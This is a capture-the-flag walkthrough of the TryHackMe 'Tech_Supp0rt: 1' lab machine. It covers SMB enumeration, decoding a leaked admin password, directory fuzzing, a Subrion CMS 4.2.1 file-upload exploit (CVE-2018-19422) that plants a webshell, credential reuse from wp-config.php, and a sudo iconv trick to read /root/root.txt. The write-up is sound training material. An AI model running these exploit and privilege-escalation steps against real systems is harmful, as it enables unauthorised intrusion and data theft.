---
sidebar_position: 7
---

TryHackMe Page for the Machine => https://tryhackme.com/room/techsupp0rt1

# Enum

## rustscan nmap
```bash
rustscan -a 10.10.26.146 -- -A

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18468/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42676/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46039/udp): CLEAN (Timeout)
|   Check 4 (port 2861/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-11-04T17:24:12+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-04T11:54:12
|_  start_date: N/A

```

## SMB Server Enum

```bash
└─$ crackmapexec smb techsupport.thm -u '' -p '' 
SMB         techsupport.thm 445    TECHSUPPORT      [*] Windows 6.1 (name:TECHSUPPORT) (domain:) (signing:False) (SMBv1:True)
SMB         techsupport.thm 445    TECHSUPPORT      [+] \: 


└─$ crackmapexec smb techsupport.thm -u 'a' -p '' --shares
SMB         techsupport.thm 445    TECHSUPPORT      [*] Windows 6.1 (name:TECHSUPPORT) (domain:) (signing:False) (SMBv1:True)
SMB         techsupport.thm 445    TECHSUPPORT      [+] \a: 
SMB         techsupport.thm 445    TECHSUPPORT      [+] Enumerated shares
SMB         techsupport.thm 445    TECHSUPPORT      Share           Permissions     Remark
SMB         techsupport.thm 445    TECHSUPPORT      -----           -----------     ------
SMB         techsupport.thm 445    TECHSUPPORT      print$                          Printer Drivers
SMB         techsupport.thm 445    TECHSUPPORT      websvr          READ            
SMB         techsupport.thm 445    TECHSUPPORT      IPC$                            IPC Service (TechSupport server (Samba, Ubuntu))

┌──(kali㉿kali)-[~/Documents/ctf/thm_easy_techsupport]
└─$ smbclient //techsupport.thm/websvr   
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> PROMPT OFF
smb: \> RECURSE ON
smb: \> mget *
getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/ctf/thm_easy_techsupport]
└─$ ll    
total 4
-rw-r--r-- 1 kali kali 273 Nov  4 08:58 enter.txt
                                                                                                                                                             
┌──(kali㉿kali)-[~/Documents/ctf/thm_easy_techsupport]
└─$ cat enter.txt                                         
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

Trying to access this `/subrion` folder. Did not work in the browser. So tried accessing it via curl
```bash
└─$ curl -v http://techsupport.thm/subrion/
*   Trying 10.10.26.146:80...
* Connected to techsupport.thm (10.10.26.146) port 80 (#0)
> GET /subrion/ HTTP/1.1
> Host: techsupport.thm
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Fri, 04 Nov 2022 13:04:03 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Set-Cookie: INTELLI_06c8042c3d=0knjt7oo4bvcpfd14hns363f0i; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: INTELLI_06c8042c3d=0knjt7oo4bvcpfd14hns363f0i; expires=Fri, 04-Nov-2022 13:34:03 GMT; Max-Age=1800; path=/
< Location: http://10.0.2.15/subrion/subrion/
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host techsupport.thm left intact

```

No wonder its not working. There is a 302 redirect to a strange IP. Also a strange cookie value.

The `enter.txt` mentions a *panel*, which I am guessing is some kind of CMS admin panel.

Let's try and find it. Modifying my usual `ffuf` statement to remove the `-r` option to ensure redirects are not followed. Also filtering for 302 status codes. Regarding the 302, the server seems to be configured to return a 302 redirect to 10.0.2.15, when we try to access a subfolder of `subrion`, which will make fuzzing a pain in the behind if we dont handle it properly.

Example
```bash
└─$ curl -v http://techsupport.thm/subrion/whatintheworld/
*   Trying 10.10.26.146:80...
* Connected to techsupport.thm (10.10.26.146) port 80 (#0)
> GET /subrion/whatintheworld/ HTTP/1.1
> Host: techsupport.thm
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Fri, 04 Nov 2022 13:21:48 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Set-Cookie: INTELLI_06c8042c3d=0e7gu6bkk63fuvtkv8t5rfk5sr; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: INTELLI_06c8042c3d=0e7gu6bkk63fuvtkv8t5rfk5sr; expires=Fri, 04-Nov-2022 13:51:48 GMT; Max-Age=1800; path=/
< Location: http://10.0.2.15/subrion/subrion/whatintheworld/
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host techsupport.thm left intact

```

Note: Also removed the `-recursion` option. There is a `/` after FUZZ. If we don't add this, the server returns a 301 with the slash added. But for the recursion option to work, the FUZZ keyword needs to be the last thing on the URL string. 

Now, let's fuzz!

```bash
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://techsupport.thm/subrion/FUZZ/ -o ffuf/raftLarge -of html -ic -c -e .txt,.html,.bak,.gz,.zip,.php,.db,.sql,.tar.gz -sf -t 50 -fc 302 

install                 [Status: 200, Size: 13125, Words: 6273, Lines: 212, Duration: 311ms]
updates                 [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 196ms]
panel.php               [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 792ms]
panel.sql               [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 792ms]
panel.bak               [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 792ms]
panel.db                [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 792ms]
panel                   [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 793ms]
panel.html              [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 793ms]
panel.zip               [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 793ms]
panel.txt               [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 793ms]
panel.gz                [Status: 200, Size: 6275, Words: 1618, Lines: 107, Duration: 794ms]

```

- http://techsupport.thm/subrion/install/install/ - Pre-installation check. Shows software versions of multiple installed software on the machine.
- http://techsupport.thm/subrion/panel/ - Login portal. The credentials we found earlier in the SMB share dont work. 

Trying to decode password in Cyberchef. 
https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true,false)

Subrion login creds
| user | pass |
| -- | -- |
| admin | CENSORED |

## Subrion Admin Portal Enum

After login.
![](/img/pasted_image_20221104194454.png)

Subrion Version 4.2.1 is installed. Searching for anything regarding this version on ExploitDB, we get https://www.exploit-db.com/exploits/49876. An arbitrary file upload exploit.

Let's try and use it.

### Uploading a reverse shell using **CVE-2018-19422**

Don't forget to add the slash after `panel` in the URL when running the exploit.

```bash
└─$ python3 49876.py -u http://techsupport.thm/subrion/panel/ --user=admin --passw=CENSORED
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://techsupport.thm/subrion/panel/
[+] Success!
[+] Got CSRF token: 7LJC4WPSmVW99qpA8XKWZZPAUDIcilg43wfRfpQi
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: ipmrjrdahkbtipn

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://techsupport.thm/subrion/panel/uploads/ipmrjrdahkbtipn.phar 

$ 

```

The above exploit gives us a command shell. Let's pivot to a full featured reverse shell by running a Python3 reverse shell command.
Here are some good examples => https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

With this shell, we can get a foothold on the machine.

# Foothold

*wp-config.php*

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CENSORED' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );


```

Trying to do an SSH login to the `scamsite` user(which we found in the home folder) using the above password?

Success!! We now have a proper login shell.

Let's try for privesc

# Privesc

```bash
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

Looks like we have `sudo` permissions for one command. Let's see if we can leverage that for privesc.

Yes we can => https://gtfobins.github.io/gtfobins/iconv/#sudo

```bash
scamsite@TechSupport:~$ sudo /usr/bin/iconv 8859_1 -t 8859_1 /root/root.txt
/usr/bin/iconv: cannot open input file `8859_1': No such file or directory
CENSORED  -

```

DONE!!
